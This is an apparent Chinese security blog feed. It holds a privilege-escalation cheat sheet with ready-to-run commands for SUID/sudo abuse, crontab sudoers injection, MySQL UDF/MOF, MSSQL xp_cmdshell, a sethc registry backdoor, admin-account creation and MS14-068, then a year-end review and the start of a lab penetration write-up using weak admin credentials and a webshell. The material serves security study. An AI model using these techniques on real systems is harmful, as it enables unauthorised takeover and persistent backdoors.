href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04.1</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220307133812910.png" alt="image-20220307133812910"></p><h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>寻找root用户拥有的suid的文件。普通用户通过suid能够以文件拥有者身份允许该文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000-print2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br><span class="line">参考谢公子  https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;article&#x2F;details&#x2F;84872644</span><br></pre></td></tr></table></figure><p>可以利用提权的文件列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure><p>如果执行命令发现以上程序文件列表，即可提权，例如：发现 /usr/bin/find</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch aaa</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find  aaa   -exec whoami \;</span><br></pre></td></tr></table></figure><p>vim</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure><p>less</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less &#x2F;etc&#x2F;passwd</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>awk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>知道账户密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br><span class="line"></span><br><span class="line">sudo python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>漏洞</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>crontab提权</p><ol><li>编辑/etc/crontab，设置每隔1分钟执行一次sh脚本</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * root sh &#x2F;home&#x2F;test&#x2F;test.sh &gt;&gt; &#x2F;tmp&#x2F;test.txt</span><br></pre></td></tr></table></figure><ol start="2"><li>如果test用户有权限操作test.sh，则存在提权漏洞。下面使用test用户修改test.sh：将test用户加入sudoers</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv test.sh test.sh.bak</span><br><span class="line"></span><br><span class="line">vim test.sh                                                               echo &quot;test ALL&#x3D;(root) NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>等待1分钟后，成功提权</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p><h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><p>原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</span><br></pre></td></tr></table></figure><p>条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. mysql用户(root)的密码，（查询，破解hash）</span><br><span class="line">2. secure_file_priv的值为空，具有写入权限，</span><br><span class="line">如果mysql服务器开启了secure-file-priv选项，就只能将文件导出到指定目录下</span><br><span class="line"></span><br><span class="line">dll位置：</span><br><span class="line">mysql版本&gt;&#x3D;5.1 dll文件导入lib\plugin目录</span><br><span class="line">5.0&lt;mysql版本&lt;5.1 dll文件导入c:\windows或者c:\windows\system32目录下</span><br><span class="line"></span><br><span class="line">mysql版本&lt;4.1  任意位置</span><br><span class="line">4.1&lt;&#x3D;mysql版本&lt;5.0</span><br></pre></td></tr></table></figure><p>查看mysql的版本</p><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/57.png"></p><p>查看<code>secure_file_priv</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在 &#x2F;tmp&#x2F; 目录下，此时也无法提权</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/58.png"></p><p>此处<code>secure_file_priv</code>的值为空，符合提权的要求</p><p>查看<code>plugin</code>的目录名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;plugin%&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/59.png"></p><p>查询目录的绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@plugin_dir;</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/60.png"></p><p>查看系统架构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/61.png"></p><p>可以看到该主机是64位的</p><p>接下来将udf.dll文件写入plugin目录，并创建函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x十六进制内容 into dumpfile &quot;plugin的目录\\udf.dll&quot;</span><br></pre></td></tr></table></figure><p>把桌面上的tools文件夹中的udf.txt里面的十六进制内容写入<code>C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\udf.dll</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x4D5A90000300000 ...... into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/62.png"></p><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/63.png"></p><p>成功将udf.dll写入目标路径</p><p>导入udf函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;udf.dll&#39;;    # 导入sys_eval函数</span><br><span class="line"></span><br><span class="line">select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;   # 查看创建的sys_eval函数</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/64.png"></p><p>执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#39;whoami&#39;);</span><br><span class="line"></span><br><span class="line">select sys_eval(&#39;ipconfig&#39;);</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/65.png"></p><p>成功获取system权限</p><h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><p>原理：</p><p>对c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件  具有读写权限，在nullevt.mof  中可以构造恶意vbs脚本（特性是每隔一段时间执行一次）进行命令执行 </p><p>条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv参数不为null</span><br><span class="line">mysql启动身份具有权限去读写 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</span><br><span class="line">windows 03及以下版本</span><br></pre></td></tr></table></figure><p>公开nullevt.mof 代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user shmily 123456 &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>导入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;upload&#x2F;1.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br></pre></td></tr></table></figure><h1 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h1><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p><code>xp_cmdshell</code>在<code>mssql2000</code>中是默认开启的，不过在<code>mssql2005</code>之后的版本中则是默认关闭的。</p><p>查询xp_cmdshell是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*)from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39; ;</span><br></pre></td></tr></table></figure><p>启用<code>xp_cmdshell</code>命令  ，需要管理员SA权限，否在不能启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user shmily 123. &#x2F;add&#39;</span><br></pre></td></tr></table></figure><h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>xp_cmdshell被删除时候，sp_oacreate默认被禁止，需要开启。<code>sp_oacreate</code>在 <code>SQL Server</code>实例上创建<code>OLE</code>对象实例。</p><p>恢复sp_oacreate</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure><p>命令执行   -&gt;输出到c:\1.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\\1.txt&#39;;</span><br></pre></td></tr></table></figure><h3 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h3><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.</p><p><a href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p><h3 id="镜像劫持提权"><a href="#镜像劫持提权" class="headerlink" title="镜像劫持提权"></a>镜像劫持提权</h3><p>通过regwrite函数修改注册表进行，regwrite需要开启</p><p>参考上面开启Ad Hoc Distributed，并恢复regwrite</p><p>劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_regwrite @rootkey&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;,@key&#x3D;&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#39;,@value_name&#x3D;&#39;Debugger&#39;,@type&#x3D;&#39;REG_SZ&#39;,@value&#x3D;&#39;c:\windows\system32\cmd.exe&#39;</span><br></pre></td></tr></table></figure><p>查看Debugger 是否为cmd路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;Debugger&#39;</span><br></pre></td></tr></table></figure><p>然后远程桌面，五次shift</p><h3 id="JOB提权"><a href="#JOB提权" class="headerlink" title="JOB提权"></a>JOB提权</h3><p>创建任务X，执行命令，返回结果</p><p>启动sqlagent服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_servicecontrol &#39;start&#39;,&#39;SQLSERVERAGENT&#39;</span><br></pre></td></tr></table></figure><p>创建任务x，执行添加账户的命令，然后将命令返回结果输出到<code>q.txt</code>中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use msdb</span><br><span class="line">exec sp_delete_job null,&#39;x&#39;</span><br><span class="line">exec sp_add_job &#39;x&#39;</span><br><span class="line">exec sp_add_jobstep null,&#39;x&#39;,null,&#39;1&#39;,&#39;cmdexec&#39;,&#39;cmd &#x2F;c &quot;net user test test &#x2F;add &amp;net localgroup administrators test &#x2F;add&gt;c:&#x2F;q.txt&quot;&#39;</span><br><span class="line">exec sp_add_jobserver null,&#39;x&#39;,@@servername</span><br><span class="line">exec sp_start_job &#39;x&#39;;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p><h1 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>原理：PAC问题</p><p>用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。</p><p>如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。</p><p>将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前提条件：</span><br><span class="line"></span><br><span class="line">域控没有打该漏洞补丁(KB3011780)</span><br><span class="line"></span><br><span class="line">已经获取普通域用户的账户，密码，hash，sid（whoami &#x2F;user）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line"></span><br><span class="line">1.mimikatz清除票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">2.ms14-068.exe生成票据</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr(ip)&gt;</span><br><span class="line"></span><br><span class="line">-u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip</span><br><span class="line"></span><br><span class="line">3.mumukatz导入票据，权限提升为域管</span><br><span class="line">kerberos::ptc &quot;票据文件名&quot;</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-42287-CVE-2021-42278"><a href="#CVE-2021-42287-CVE-2021-42278" class="headerlink" title="CVE-2021-42287/CVE-2021-42278"></a>CVE-2021-42287/CVE-2021-42278</h3><p>即saMAccountName spoofing漏洞，仅有一个普通域账号的场景下，利用该漏洞接管全域。</p><p><a href="https://www.freebuf.com/vuls/317773.html">域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;windows-提权&quot;&gt;&lt;a href=&quot;#windows-提权&quot; class=&quot;headerlink&quot; title=&quot;windows 提权&quot;&gt;&lt;/a&gt;windows 提权&lt;/h1&gt;&lt;hr&gt;
&lt;h3 id=&quot;内核提权&quot;&gt;&lt;a href=&quot;#内核提权&quot; class=&quot;headerlink&quot; title=&quot;内核提权&quot;&gt;&lt;/a&gt;内核提权&lt;/h3&gt;&lt;p&gt;汇总：&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits&quot;&gt;https://github.com/SecWiki/windows-kernel-exploits&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&quot;提权辅助&quot;&gt;&lt;a href=&quot;#提权辅助&quot; class=&quot;headerlink&quot; title=&quot;提权辅助&quot;&gt;&lt;/a&gt;提权辅助&lt;/h5&gt;&lt;p&gt;systeminfo   查看补丁&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png&quot; alt=&quot;image-20220221104049104&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://i.hacking8.com/tiquan&quot;&gt;https://i.hacking8.com/tiquan&lt;/a&gt; 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Ascotbe/Kernelhub&quot;&gt;Windows提权漏洞合集&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="提权" scheme="http://example.com/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>2021总结</title>
    <link href="http://example.com/2022/01/11/2021%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2022/01/11/2021%E6%80%BB%E7%BB%93/</id>
    <published>2022-01-11T11:49:16.000Z</published>
    <updated>2022-01-11T13:12:16.991Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><ul><li><input checked disabled type="checkbox"> 她依然在</li><li><input checked disabled type="checkbox"> 暑假实习</li><li><input checked disabled type="checkbox"> 体验线下awd</li></ul><a id="more"></a><ul><li><input checked disabled type="checkbox"> 不挂科</li><li><input checked disabled type="checkbox"> 加入安全团队，其他师傅好强</li><li><input checked disabled type="checkbox"> 对内网有了深入认识和利用方式</li></ul><ul><li><input disabled type="checkbox"> 实战能力太差</li><li><input disabled type="checkbox"> 没有挖洞进展</li><li><input disabled type="checkbox"> 寒假实习</li></ul><h2 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h2><ul><li><p><input disabled type="checkbox">  运动，锻炼，看书，规律作息</p></li><li><p><input disabled type="checkbox">  寒假把内网在深入透彻</p></li><li><p><input disabled type="checkbox">  挖src，CNVD，java代码审计</p></li><li><p><input disabled type="checkbox">  去古檀，，，，一定一定要通过面试，短期梦想，加油</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;2021&quot;&gt;&lt;a href=&quot;#2021&quot; class=&quot;headerlink&quot; title=&quot;2021&quot;&gt;&lt;/a&gt;2021&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;input checked disabled type=&quot;checkbox&quot;&gt; 她依然在&lt;/li&gt;
&lt;li&gt;&lt;input checked disabled type=&quot;checkbox&quot;&gt; 暑假实习&lt;/li&gt;
&lt;li&gt;&lt;input checked disabled type=&quot;checkbox&quot;&gt; 体验线下awd&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="经历" scheme="http://example.com/categories/%E7%BB%8F%E5%8E%86/"/>
    
    
    <category term="对2021年总结" scheme="http://example.com/tags/%E5%AF%B92021%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>简单的靶场渗透</title>
    <link href="http://example.com/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2022-01-02T18:17:22.000Z</published>
    <updated>2022-01-03T04:37:23.282Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br><span class="line">刚过完年，来玩一玩</span><br></pre></td></tr></table></figure><p>[TOC]</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">获得flag:</span><br><span class="line">1.14.65.168    </span><br><span class="line">        flag&#123;dc53e209ffa7f1cd8c7ebdc2eeff34a7&#125;    </span><br><span class="line">flag1 : flag&#123;f784234649d7ef161229349d1d76ba8d&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.38tomcat</span><br><span class="line">flag3 ：flag&#123;03bbcaf39bdd08fa8d0d9e5477e102c5&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.66</span><br><span class="line">flag5  :flag&#123;b717ca3e4543f05e6970ede833d68ba4&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.76</span><br><span class="line">flag4  :flag&#123;22fceae28669c34d139f7ff6db690acb&#125; </span><br><span class="line"></span><br><span class="line">172.16.20.135</span><br><span class="line">flag9  :flag&#123;27e6221a8a55c8ee7396e74531dc7d9d&#125;</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Powered by <a href="http://www.dedecms.com/"><strong>DedeCMSV57_UTF8_SP1</strong></a> </p><p><a href="http://1.14.65.168:8077/data/admin/ver.txt">http://1.14.65.168:8077/data/admin/ver.txt</a>       版本时间20170303</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="http://1.14.65.168:8077/dede/">http://1.14.65.168:8077/dede/</a>             admin/admin 后台弱口令</p><p>后台任意文件上传</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102150406908.png" alt="image-20220102150406908"></p><p>哥斯拉连接，看了要提权</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151302899.png" alt="image-20220102151302899"></p><p>html目录下     第一个flag{dc53e209ffa7f1cd8c7ebdc2eeff34a7}  ，或者robots.txt 直接给的有路径</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151350497.png" alt="image-20220102151350497"></p><p>根目录下   第二个flag{f784234649d7ef161229349d1d76ba8d}</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151427997.png" 